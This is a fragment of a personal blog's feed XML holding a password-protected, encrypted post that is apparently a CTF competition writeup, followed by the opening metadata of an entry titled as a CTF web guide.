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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次比赛非常没有状态，可能是很久没参加正式比赛的缘故。这篇文章为赛后总结，也是一篇writeup。emmmm，我会认真写。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf-web指南</title>
    <link href="https://winter3un.github.io/2018/07/30/ctf-web/"/>
    <id>https://winter3un.github.io/2018/07/30/ctf-web/</id>
    <published>2018-07-31T01:48:54.000Z</published>
    <updated>2018-09-02T04:20:26.564Z</updated>
    
